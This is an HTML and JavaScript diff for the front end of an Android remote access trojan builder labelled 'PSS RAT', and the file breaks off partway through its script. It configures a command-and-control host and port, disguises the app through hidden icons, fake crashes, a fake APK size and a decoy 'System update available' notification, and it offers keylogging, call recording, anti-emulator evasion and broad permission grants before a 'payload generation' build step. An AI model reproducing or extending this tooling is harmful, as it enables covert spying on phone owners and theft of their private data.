@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PSS — Builder</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --g1:#00ff88;--g2:#00dd77;--g3:#00bb66;--g4:#009955;--g5:#006633;
+    --g-glow:rgba(0,255,136,0.3);--g-dim:rgba(0,120,70,0.5);
+    --bg:#050608;--bg2:#0a0c10;--bg3:#0e1116;
+    --panel:rgba(10,12,16,0.9);
+    --border:rgba(0,255,136,.08);--border-h:rgba(0,255,136,.18);--border-dim:rgba(0,80,50,.25);
+    --t1:#e8ede9;--t2:#8b9b8e;--t3:#4a5a4e;
+    --accent:#4488ff;
+    --mono:'JetBrains Mono',monospace;--sans:'Inter',system-ui,sans-serif;--display:'Orbitron',sans-serif;
+    --nav2-width:160px;
+  }
+
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{width:100%;height:100%;background:var(--bg);color:var(--t1);font-family:var(--sans);overflow:hidden;user-select:none;-webkit-font-smoothing:antialiased}
+
+  ::selection{background:rgba(0,255,136,.2);color:#fff}
+  ::-webkit-scrollbar{width:4px}
+  ::-webkit-scrollbar-track{background:transparent}
+  ::-webkit-scrollbar-thumb{background:rgba(0,255,136,.12);border-radius:2px}
+
+  input[type=number]::-webkit-outer-spin-button,
+  input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
+  input[type=number]{-moz-appearance:textfield}
+
+  #page-layout{
+    position:relative;z-index:10;display:grid;
+    grid-template-columns:var(--nav2-width) 1fr;
+    height:100vh;width:100%;padding-bottom:28px;
+  }
+
+  /* NAV */
+  #nav2{background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden}
+  #nav2-header{font-family:var(--display);font-size:8px;letter-spacing:3px;color:var(--g5);padding:10px 14px 8px;border-bottom:1px solid var(--border-dim);text-transform:uppercase}
+  .nav2-btn{display:flex;align-items:center;gap:10px;padding:12px 16px;cursor:pointer;font-family:var(--mono);font-size:10px;letter-spacing:1px;color:var(--t3);border-left:3px solid transparent;border-bottom:1px solid rgba(0,80,50,.08);transition:all .18s ease;text-transform:uppercase}
+  .nav2-btn:hover{background:rgba(0,255,136,.03);color:var(--t2);border-left-color:var(--g5)}
+  .nav2-btn.active{background:rgba(0,255,136,.05);color:var(--g1);border-left-color:var(--g1);text-shadow:0 0 8px var(--g-glow)}
+  .nav2-btn .nav2-icon{width:14px;height:14px;fill:currentColor;flex-shrink:0;opacity:.7}
+  .nav2-spacer{flex:1}
+
+  /* CONTENT */
+  #content-area{display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+  #content-topbar{display:flex;align-items:center;gap:12px;padding:10px 20px;border-bottom:1px solid var(--border);background:rgba(0,255,136,.01);flex-shrink:0}
+  #content-topbar .section-title{font-family:var(--display);font-size:10px;font-weight:700;letter-spacing:3px;color:var(--g1);text-shadow:0 0 10px var(--g-glow)}
+  #content-topbar .section-breadcrumb{font-family:var(--mono);font-size:9px;color:var(--g5);letter-spacing:1px}
+  .topbar-spacer{flex:1}
+  .topbar-status{font-family:var(--mono);font-size:9px;color:var(--t3);display:flex;align-items:center;gap:6px}
+  .status-dot-sm{width:5px;height:5px;border-radius:50%;background:var(--g1);box-shadow:0 0 8px var(--g1);animation:sdpulse 2s ease-in-out infinite}
+  @keyframes sdpulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+  #content-body{flex:1;overflow-y:auto;padding:24px 32px}
+
+  /* SECTIONS */
+  .section-panel{display:none}
+  .section-panel.active{display:block}
+
+  .section-heading{font-family:var(--display);font-size:9px;letter-spacing:3px;color:var(--g1);text-shadow:0 0 8px var(--g-glow);margin-bottom:20px;padding-bottom:8px;border-bottom:1px solid var(--border-dim);display:flex;align-items:center;gap:8px}
+  .section-heading::before{content:'//';color:var(--g5)}
+
+  /* FORM */
+  .form-group{display:grid;grid-template-columns:200px 1fr auto;align-items:center;gap:18px;margin-bottom:24px;padding-bottom:24px;border-bottom:1px solid rgba(0,80,50,.1)}
+  .form-group:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+
+  .form-label{font-size:14px;font-weight:600;color:var(--t1);letter-spacing:.5px}
+  .form-label .form-label-sub{display:block;font-size:9px;color:var(--t3);font-family:var(--mono);letter-spacing:1px;margin-top:2px}
+
+  .form-input{background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--g1);font-family:var(--mono);font-size:12px;padding:8px 12px;outline:none;transition:border-color .2s,box-shadow .2s;width:100%}
+  .form-input:focus{border-color:var(--g4);box-shadow:0 0 10px rgba(0,255,136,.08);color:var(--t1)}
+  .form-input::placeholder{color:var(--t3)}
+
+  .spinner-wrap{position:relative;display:flex;align-items:center}
+  .spinner-wrap input{padding-right:28px}
+  .spinner-arrows{position:absolute;right:0;top:0;bottom:0;display:flex;flex-direction:column;width:22px;border-left:1px solid var(--border)}
+  .spinner-up,.spinner-dn{flex:1;background:var(--bg2);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;color:var(--g5);font-size:8px;transition:background .15s,color .15s}
+  .spinner-up:hover,.spinner-dn:hover{background:rgba(0,255,136,.06);color:var(--g1)}
+  .spinner-up{border-bottom:1px solid var(--border)}
+
+  .form-action-btn{width:36px;height:36px;display:flex;align-items:center;justify-content:center;background:transparent;border:none;cursor:pointer;font-size:22px;font-weight:300;color:var(--g1);transition:all .2s;line-height:1}
+  .form-action-btn:hover{text-shadow:0 0 12px var(--g1);transform:scale(1.1)}
+  .form-action-btn.minus{color:var(--g5)}
+  .form-action-btn.minus:hover{color:var(--g1)}
+
+  .dns-list-box{background:var(--bg);border:1px solid var(--border-dim);border-radius:6px;padding:10px 14px;margin-top:8px;min-height:100px;font-family:var(--mono);font-size:10px;color:var(--t3)}
+  .dns-list-box .dns-header{font-size:9px;letter-spacing:2px;color:var(--g5);padding-bottom:6px;border-bottom:1px solid var(--border-dim);margin-bottom:8px;text-transform:uppercase}
+  .dns-entry{display:flex;align-items:center;gap:8px;padding:4px 0;color:var(--g2);border-bottom:1px solid rgba(0,80,50,.1)}
+  .dns-entry:last-child{border-bottom:none}
+  .dns-entry .dns-dot{width:5px;height:5px;border-radius:50%;background:var(--g5);flex-shrink:0}
+
+  .form-select{background:var(--bg);border:1px solid var(--border);border-radius:6px;color:var(--g1);font-family:var(--mono);font-size:12px;padding:8px 12px;outline:none;width:100%;cursor:pointer;appearance:none;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 10 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%23006633'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;background-size:8px}
+  .form-select:focus{border-color:var(--g4)}
+  .form-select option{background:var(--bg);color:var(--t1)}
+
+  /* Toggle */
+  .thor-toggle{width:44px;height:24px;background:rgba(60,60,60,.4);border-radius:12px;position:relative;cursor:pointer;border:1px solid rgba(100,100,100,.2);transition:background .25s,border-color .25s;flex-shrink:0}
+  .thor-toggle.checked{background:rgba(0,180,80,.5);border-color:rgba(0,220,100,.4);box-shadow:0 0 10px rgba(0,255,136,.2)}
+  .thor-toggle-knob{position:absolute;top:3px;left:3px;width:16px;height:16px;border-radius:50%;background:#999;transition:transform .25s,background .25s;box-shadow:0 1px 4px rgba(0,0,0,.4)}
+  .thor-toggle.checked .thor-toggle-knob{transform:translateX(20px);background:var(--g1)}
+
+  /* Sub panels */
+  .sub-panel{border:1px solid var(--border);border-radius:8px;overflow:hidden}
+  .sub-panel-title{font-size:14px;font-weight:600;color:var(--t1);padding:10px 18px;text-align:center;border-bottom:1px solid var(--border);letter-spacing:.5px;background:rgba(0,255,136,.01)}
+  .sub-panel-body{padding:16px 18px}
+  .sub-row{display:grid;grid-template-columns:160px 1fr auto;align-items:center;gap:14px;margin-bottom:12px}
+  .sub-row-label{font-size:12px;color:var(--t3);letter-spacing:.3px}
+
+  /* Icon upload */
+  .icon-upload-box{width:100px;height:80px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden;transition:border-color .2s}
+  .icon-upload-box:hover{border-color:var(--g4)}
+  .icon-upload-placeholder{font-size:28px;opacity:.25}
+  .icon-upload-box img{width:100%;height:100%;object-fit:contain}
+
+  .icon-btn{width:32px;height:32px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:all .2s;color:var(--accent);font-size:12px;font-weight:700}
+  .icon-btn:hover{border-color:var(--g4);box-shadow:0 0 8px rgba(0,255,136,.1)}
+
+  /* Tools grid */
+  .tools-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px 36px}
+  .tools-row{display:flex;align-items:center;gap:10px}
+  .tools-label{font-size:14px;font-weight:600;color:var(--t1);letter-spacing:.3px}
+
+  /* Permissions */
+  .perm-list-box{background:var(--bg);border:1px solid var(--border);border-radius:6px 6px 0 0;min-height:300px;max-height:360px;overflow-y:auto;padding:6px 0}
+  .perm-entry{padding:6px 14px;font-family:var(--mono);font-size:10px;color:var(--t3);border-bottom:1px solid rgba(0,80,50,.06);cursor:pointer;transition:background .12s,color .12s;display:flex;align-items:center;gap:8px}
+  .perm-entry:last-child{border-bottom:none}
+  .perm-entry:hover{background:rgba(0,255,136,.02);color:var(--t2)}
+  .perm-entry.selected{background:rgba(0,255,136,.05);color:var(--g1)}
+  .perm-entry .perm-dot{width:4px;height:4px;border-radius:50%;background:var(--g5);flex-shrink:0}
+  .perm-remove-btn{width:100%;padding:10px;background:var(--bg2);border:1px solid var(--border);border-top:none;color:var(--g1);font-family:var(--mono);font-size:10px;letter-spacing:2px;cursor:pointer;transition:background .2s;border-radius:0 0 6px 6px}
+  .perm-remove-btn:hover{background:rgba(0,255,136,.04)}
+
+  .tag-badge{display:inline-block;padding:1px 6px;background:rgba(0,255,136,.05);border:1px solid var(--g5);border-radius:3px;font-family:var(--mono);font-size:8px;color:var(--g5);letter-spacing:1px;vertical-align:middle;margin-left:6px}
+
+  /* Build */
+  .build-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px 32px;margin:8px auto 0;background:rgba(0,180,80,.15);border:1px solid var(--g3);border-radius:8px;color:var(--g1);font-family:var(--display);font-size:10px;font-weight:700;letter-spacing:3px;cursor:pointer;transition:all .2s;text-shadow:0 0 8px var(--g-glow);box-shadow:0 0 12px rgba(0,255,136,.08)}
+  .build-btn:hover{background:rgba(0,180,80,.25);box-shadow:0 0 24px rgba(0,255,136,.2);transform:translateY(-1px)}
+  .build-btn svg{width:16px;height:16px;fill:currentColor}
+
+  .build-log-box{border:1px solid var(--border);border-radius:6px;min-height:400px;background:rgba(0,0,0,.5);font-family:var(--mono);font-size:10px;color:var(--g5);padding:12px 16px;overflow-y:auto}
+
+  .back-btn-top{padding:5px 12px;background:transparent;border:1px solid var(--border);color:var(--t3);font-family:var(--display);font-size:8px;cursor:pointer;border-radius:4px;transition:all .2s;letter-spacing:1px}
+  .back-btn-top:hover{border-color:var(--g3);color:var(--g1)}
+
+  /* Status bar */
+  #status-bar{position:fixed;bottom:0;left:0;right:0;height:28px;background:var(--bg2);border-top:1px solid var(--border);display:flex;align-items:center;padding:0 16px;gap:20px;font-family:var(--mono);font-size:9px;color:var(--g5);z-index:30;letter-spacing:1px}
+  .status-item{display:flex;align-items:center;gap:6px}
+  .status-dot{width:5px;height:5px;border-radius:50%;background:var(--g1);box-shadow:0 0 8px var(--g1);animation:sdpulse 2s ease-in-out infinite}
+  #clock{margin-left:auto;color:var(--g2);font-size:10px;text-shadow:0 0 8px var(--g-glow)}
+  .scroll-text{overflow:hidden;white-space:nowrap;flex:1}
+  #scroll-inner{display:inline-block;animation:marquee 25s linear infinite;color:var(--g5);font-size:9px}
+  @keyframes marquee{from{transform:translateX(100%)}to{transform:translateX(-100%)}}
+</style>
+</head>
+<body>
+
+<div id="page-layout">
+  <div id="nav2">
+    <div id="nav2-header">// BUILDER</div>
+
+    <div class="nav2-btn active" data-section="connection" onclick="switchSection('connection')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+      Connection
+    </div>
+    <div class="nav2-btn" data-section="options" onclick="switchSection('options')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M3 17v2h6v-2H3zM3 5v2h10V5H3zm10 16v-2h8v-2h-8v-2h-2v6h2zM7 9v2H3v2h4v2h2V9H7zm14 4v-2H11v2h10zm-6-4h2V7h4V5h-4V3h-2v6z"/></svg>
+      Options
+    </div>
+    <div class="nav2-btn" data-section="tools" onclick="switchSection('tools')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z"/></svg>
+      Tools
+    </div>
+    <div class="nav2-btn" data-section="login" onclick="switchSection('login')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      Login
+    </div>
+    <div class="nav2-btn" data-section="permissions" onclick="switchSection('permissions')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+      Permissions
+    </div>
+    <div class="nav2-btn" data-section="build" onclick="switchSection('build')">
+      <svg class="nav2-icon" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+      Build
+    </div>
+    <div class="nav2-spacer"></div>
+  </div>
+
+  <div id="content-area">
+    <div id="content-topbar">
+      <span class="section-title" id="topbar-title">CONNECTION</span>
+      <span class="section-breadcrumb">// BUILDER / <span id="topbar-sub">HOST_CONFIG</span></span>
+      <div class="topbar-spacer"></div>
+      <div class="topbar-status"><div class="status-dot-sm"></div>READY</div>
+    </div>
+
+    <div id="content-body">
+
+      <!-- CONNECTION -->
+      <div class="section-panel active" id="section-connection">
+        <div class="section-heading">HOST CONFIGURATION</div>
+        <div class="form-group">
+          <div class="form-label">Host / IP<span class="form-label-sub">Target host or IP address</span></div>
+          <input class="form-input" type="text" id="input-host" value="127.0.0.1" spellcheck="false" autocomplete="off">
+          <button class="form-action-btn" onclick="addDnsEntry()" title="Add to list">+</button>
+        </div>
+        <div class="form-group">
+          <div class="form-label">Connection Port<span class="form-label-sub">Primary listener port</span></div>
+          <div class="spinner-wrap">
+            <input class="form-input" type="number" id="input-port" value="7777" min="1" max="65535" spellcheck="false">
+            <div class="spinner-arrows">
+              <button class="spinner-up" onclick="stepPort(1)">&#9650;</button>
+              <button class="spinner-dn" onclick="stepPort(-1)">&#9660;</button>
+            </div>
+          </div>
+          <button class="form-action-btn minus" onclick="removeDnsEntry()" title="Remove last">&#8212;</button>
+        </div>
+        <div class="dns-list-box">
+          <div class="dns-header">DNS / IP:PORT</div>
+          <div id="dns-entries"></div>
+        </div>
+      </div>
+
+      <!-- OPTIONS -->
+      <div class="section-panel" id="section-options">
+        <div class="section-heading">OPTIONS</div>
+        <div class="form-group">
+          <div class="form-label">After Install<span class="form-label-sub">Action to perform after installation</span></div>
+          <select class="form-select" id="input-afterinstall">
+            <option value="">— Select —</option>
+            <option value="nothing">Nothing</option>
+            <option value="open">Open App</option>
+            <option value="hide">Hide Icon</option>
+            <option value="fake_crash">Fake Crash</option>
+          </select>
+          <button class="form-action-btn" style="color:var(--accent);font-size:16px;font-weight:bold;" title="Info">?</button>
+        </div>
+
+        <div class="sub-panel" style="margin-bottom:24px;">
+          <div class="sub-panel-title">Custom App Identity</div>
+          <div class="sub-panel-body">
+            <div class="sub-row">
+              <span class="sub-row-label">App Name</span>
+              <input class="form-input" type="text" id="input-appname" value="PSS RAT" spellcheck="false">
+            </div>
+            <div class="sub-row">
+              <span class="sub-row-label">WebSite Link</span>
+              <input class="form-input" type="text" id="input-applink" placeholder="Optional" spellcheck="false">
+            </div>
+            <div class="sub-row">
+              <span class="sub-row-label">App Version</span>
+              <input class="form-input" type="text" id="input-appversion" value="1.0" spellcheck="false">
+              <button class="icon-btn" onclick="randomizeVersion()" title="Randomize">R</button>
+            </div>
+            <div class="sub-row">
+              <span class="sub-row-label">Package Name</span>
+              <input class="form-input" type="text" id="input-packagename" value="com.pss.rat" spellcheck="false">
+              <button class="icon-btn" onclick="randomizePackage()" title="Randomize">R</button>
+            </div>
+            <div style="text-align:center;margin-top:18px;">
+              <span class="sub-row-label" style="display:block;margin-bottom:8px;">App Icon</span>
+              <div style="display:flex;justify-content:center;gap:16px">
+                <div class="icon-upload-box" id="icon-upload-main" onclick="document.getElementById('file-icon-main').click()" title="Upload icon">
+                  <input type="file" id="file-icon-main" accept="image/*" style="display:none" onchange="previewIcon(this,'icon-upload-main')">
+                  <span class="icon-upload-placeholder">&#128247;</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div style="display:flex;align-items:center;gap:14px;margin-bottom:24px;padding-bottom:24px;border-bottom:1px solid var(--border-dim)">
+          <div class="thor-toggle" id="toggle-fake-size" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div>
+          <span class="form-label" style="font-size:13px;">Fake APK Size</span>
+          <input class="form-input" type="number" id="input-fake-size" value="10" style="width:70px;text-align:center;">
+          <span style="font-family:var(--mono);font-size:10px;color:var(--t3)">MB</span>
+        </div>
+
+        <div style="display:flex;align-items:center;gap:14px;margin-bottom:24px;padding-bottom:24px;border-bottom:1px solid var(--border-dim)">
+          <div class="thor-toggle checked" id="toggle-notif" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div>
+          <span class="form-label" style="font-size:14px;font-weight:700;">Persistent Notification</span>
+          <button class="form-action-btn" style="color:var(--accent);font-size:16px;font-weight:bold;" title="Info">?</button>
+        </div>
+
+        <div class="sub-panel">
+          <div class="sub-panel-title">Custom Notification</div>
+          <div class="sub-panel-body">
+            <div class="sub-row">
+              <span class="sub-row-label">Notification Text</span>
+              <input class="form-input" type="text" id="input-notif-text" value="System update available" spellcheck="false">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TOOLS -->
+      <div class="section-panel" id="section-tools">
+        <div class="section-heading">TOOLS / MODULES</div>
+        <div class="tools-grid">
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;">?</button><div class="thor-toggle" id="toggle-quickinstall" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Quick Install</span></div>
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;">?</button><div class="thor-toggle" id="toggle-drawoverapps" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Draw Over Apps</span></div>
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;">?</button><div class="thor-toggle" id="toggle-offlinekeylog" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Offline Keylogger</span></div>
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;">?</button><div class="thor-toggle" id="toggle-antiemulator" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Anti Emulator</span></div>
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;">?</button><div class="thor-toggle" id="toggle-supermod" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Super Mod</span></div>
+          <div class="tools-row"><button class="form-action-btn" style="color:var(--accent);font-size:16px;width:24px;"></button><div class="thor-toggle" id="toggle-recordcalls" onclick="thorToggle(this)"><div class="thor-toggle-knob"></div></div><span class="tools-label">Record Calls</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:14px;margin-top:24px;padding-top:18px;border-top:1px solid var(--border-dim)">
+          <span class="form-label" style="font-size:14px;font-weight:700;min-width:110px;">APK Version</span>
+          <select class="form-select" id="input-apkversion" style="max-width:200px;">
+            <option value="">— Select —</option>
+            <option value="5">Android 5.x (Lollipop)</option>
+            <option value="6">Android 6.x (Marshmallow)</option>
+            <option value="7">Android 7.x (Nougat)</option>
+            <option value="8">Android 8.x (Oreo)</option>
+            <option value="9">Android 9 (Pie)</option>
+            <option value="10">Android 10</option>
+            <option value="11">Android 11</option>
+            <option value="12">Android 12</option>
+            <option value="13">Android 13</option>
+            <option value="14">Android 14</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- LOGIN -->
+      <div class="section-panel" id="section-login">
+        <div class="section-heading">AUTHENTICATION</div>
+        <div class="form-group">
+          <div class="form-label">Username<span class="form-label-sub">Connection auth username</span></div>
+          <input class="form-input" type="text" id="input-user" placeholder="admin" spellcheck="false" autocomplete="off">
+          <span style="width:36px"></span>
+        </div>
+        <div class="form-group">
+          <div class="form-label">Password<span class="form-label-sub">Auth key / passphrase</span></div>
+          <input class="form-input" type="password" id="input-pass" placeholder="••••••••" autocomplete="off">
+          <span style="width:36px"></span>
+        </div>
+        <div class="form-group">
+          <div class="form-label">Auth Method<span class="form-label-sub">Authentication mode</span></div>
+          <select class="form-select" id="input-authmethod">
+            <option value="password">Password</option>
+            <option value="key">SSH Key</option>
+            <option value="token">Token</option>
+            <option value="none">None</option>
+          </select>
+          <span style="width:36px"></span>
+        </div>
+      </div>
+
+      <!-- PERMISSIONS -->
+      <div class="section-panel" id="section-permissions">
+        <div style="display:flex;align-items:center;gap:14px;margin-bottom:14px">
+          <div class="thor-toggle" id="toggle-allperms" onclick="thorToggle(this);toggleAllPerms()"><div class="thor-toggle-knob"></div></div>
+          <span style="font-family:var(--display);font-size:12px;font-weight:700;color:var(--g1);letter-spacing:2px;text-shadow:0 0 8px var(--g-glow);">All Permissions</span>
+          <select class="form-select" id="perms-dropdown" style="flex:1;max-width:600px;">
+            <option value="">— Select permission to add —</option>
+            <option value="READ_CONTACTS">READ_CONTACTS</option><option value="WRITE_CONTACTS">WRITE_CONTACTS</option><option value="GET_ACCOUNTS">GET_ACCOUNTS</option><option value="READ_CALL_LOG">READ_CALL_LOG</option><option value="WRITE_CALL_LOG">WRITE_CALL_LOG</option><option value="CALL_PHONE">CALL_PHONE</option><option value="READ_PHONE_STATE">READ_PHONE_STATE</option><option value="READ_PHONE_NUMBERS">READ_PHONE_NUMBERS</option><option value="ANSWER_PHONE_CALLS">ANSWER_PHONE_CALLS</option><option value="ADD_VOICEMAIL">ADD_VOICEMAIL</option><option value="USE_SIP">USE_SIP</option><option value="PROCESS_OUTGOING_CALLS">PROCESS_OUTGOING_CALLS</option><option value="SEND_SMS">SEND_SMS</option><option value="RECEIVE_SMS">RECEIVE_SMS</option><option value="READ_SMS">READ_SMS</option><option value="RECEIVE_WAP_PUSH">RECEIVE_WAP_PUSH</option><option value="RECEIVE_MMS">RECEIVE_MMS</option><option value="RECORD_AUDIO">RECORD_AUDIO</option><option value="CAMERA">CAMERA</option><option value="ACCESS_FINE_LOCATION">ACCESS_FINE_LOCATION</option><option value="ACCESS_COARSE_LOCATION">ACCESS_COARSE_LOCATION</option><option value="ACCESS_BACKGROUND_LOCATION">ACCESS_BACKGROUND_LOCATION</option><option value="READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</option><option value="WRITE_EXTERNAL_STORAGE">WRITE_EXTERNAL_STORAGE</option><option value="MANAGE_EXTERNAL_STORAGE">MANAGE_EXTERNAL_STORAGE</option><option value="ACCESS_MEDIA_LOCATION">ACCESS_MEDIA_LOCATION</option><option value="READ_MEDIA_IMAGES">READ_MEDIA_IMAGES</option><option value="READ_MEDIA_VIDEO">READ_MEDIA_VIDEO</option><option value="READ_MEDIA_AUDIO">READ_MEDIA_AUDIO</option><option value="BLUETOOTH">BLUETOOTH</option><option value="BLUETOOTH_ADMIN">BLUETOOTH_ADMIN</option><option value="BLUETOOTH_CONNECT">BLUETOOTH_CONNECT</option><option value="BLUETOOTH_SCAN">BLUETOOTH_SCAN</option><option value="BLUETOOTH_ADVERTISE">BLUETOOTH_ADVERTISE</option><option value="CHANGE_WIFI_STATE">CHANGE_WIFI_STATE</option><option value="ACCESS_WIFI_STATE">ACCESS_WIFI_STATE</option><option value="ACCESS_NETWORK_STATE">ACCESS_NETWORK_STATE</option><option value="INTERNET">INTERNET</option><option value="NFC">NFC</option><option value="BODY_SENSORS">BODY_SENSORS</option><option value="BODY_SENSORS_BACKGROUND">BODY_SENSORS_BACKGROUND</option><option value="ACTIVITY_RECOGNITION">ACTIVITY_RECOGNITION</option><option value="USE_BIOMETRIC">USE_BIOMETRIC</option><option value="USE_FINGERPRINT">USE_FINGERPRINT</option><option value="SET_WALLPAPER">SET_WALLPAPER</option><option value="VIBRATE">VIBRATE</option><option value="WAKE_LOCK">WAKE_LOCK</option><option value="RECEIVE_BOOT_COMPLETED">RECEIVE_BOOT_COMPLETED</option><option value="FOREGROUND_SERVICE">FOREGROUND_SERVICE</option><option value="REQUEST_INSTALL_PACKAGES">REQUEST_INSTALL_PACKAGES</option><option value="SYSTEM_ALERT_WINDOW">SYSTEM_ALERT_WINDOW</option><option value="WRITE_SETTINGS">WRITE_SETTINGS</option><option value="BIND_ACCESSIBILITY_SERVICE">BIND_ACCESSIBILITY_SERVICE</option><option value="BIND_DEVICE_ADMIN">BIND_DEVICE_ADMIN</option><option value="CHANGE_NETWORK_STATE">CHANGE_NETWORK_STATE</option><option value="DISABLE_KEYGUARD">DISABLE_KEYGUARD</option><option value="EXPAND_STATUS_BAR">EXPAND_STATUS_BAR</option><option value="FLASHLIGHT">FLASHLIGHT</option><option value="GET_TASKS">GET_TASKS</option><option value="KILL_BACKGROUND_PROCESSES">KILL_BACKGROUND_PROCESSES</option><option value="MODIFY_AUDIO_SETTINGS">MODIFY_AUDIO_SETTINGS</option><option value="PACKAGE_USAGE_STATS">PACKAGE_USAGE_STATS</option><option value="POST_NOTIFICATIONS">POST_NOTIFICATIONS</option><option value="QUERY_ALL_PACKAGES">QUERY_ALL_PACKAGES</option><option value="READ_LOGS">READ_LOGS</option><option value="REBOOT">REBOOT</option><option value="SCHEDULE_EXACT_ALARM">SCHEDULE_EXACT_ALARM</option><option value="USE_EXACT_ALARM">USE_EXACT_ALARM</option><option value="WRITE_SECURE_SETTINGS">WRITE_SECURE_SETTINGS</option>
+          </select>
+          <button class="icon-btn" style="width:auto;padding:0 12px;font-size:10px;color:var(--g1);" onclick="addPermission()">ADD</button>
+        </div>
+        <div class="perm-list-box" id="perm-list"></div>
+        <button class="perm-remove-btn" onclick="removePermission()">REMOVE</button>
+      </div>
+
+      <!-- BUILD -->
+      <div class="section-panel" id="section-build">
+        <div style="text-align:center;padding:10px 0 0;margin-bottom:14px">
+          <span style="font-family:var(--display);font-size:13px;font-weight:700;color:var(--g1);letter-spacing:4px;text-shadow:0 0 12px var(--g-glow);">PAYLOAD GENERATION</span>
+        </div>
+        <button class="build-btn" id="start-build-btn">
+          <svg viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+          START BUILD
+        </button>
+        <div class="build-log-box" id="build-log" style="margin-top:20px">// WAITING FOR COMMAND...</div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div id="status-bar">
+  <div class="status-item"><div class="status-dot"></div> BUILDER ACTIVE</div>
+  <div class="scroll-text"><span id="scroll-inner">[ PSS BUILDER v3.0 ] — PAYLOAD ENGINE READY — AES-128-CBC ENCRYPTION — BUILD SYSTEM ONLINE — </span></div>
+  <div id="clock"></div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+var socket=io();
+var sectionMeta={connection:{title:'CONNECTION',sub:'HOST_CONFIG'},options:{title:'OPTIONS',sub:'SETTINGS'},tools:{title:'TOOLS',sub:'MODULES'},login:{title:'LOGIN',sub:'AUTH_CONFIG'},permissions:{title:'PERMISSIONS',sub:'ACCESS_CONTROL'},build:{title:'BUILD',sub:'GENERATE_PAYLOAD'}};
+
+function switchSection(id){
+  document.querySelectorAll('.nav2-btn').forEach(function(b){b.classList.toggle('active',b.dataset.section===id)});
+  document.querySelectorAll('.section-panel').forEach(function(p){p.classList.toggle('active',p.id==='section-'+id)});
+  var meta=sectionMeta[id]||{title:id.toUpperCase(),sub:''};
+  document.getElementById('topbar-title').textContent=meta.title;
+  document.getElementById('topbar-sub').textContent=meta.sub;
+  document.getElementById('content-body').scrollTop=0;
+}
+
+function addDnsEntry(){
+  var host=document.getElementById('input-host').value.trim();
+  var port=document.getElementById('input-port').value.trim();
+  if(!host)return;
+  var list=document.getElementById('dns-entries');
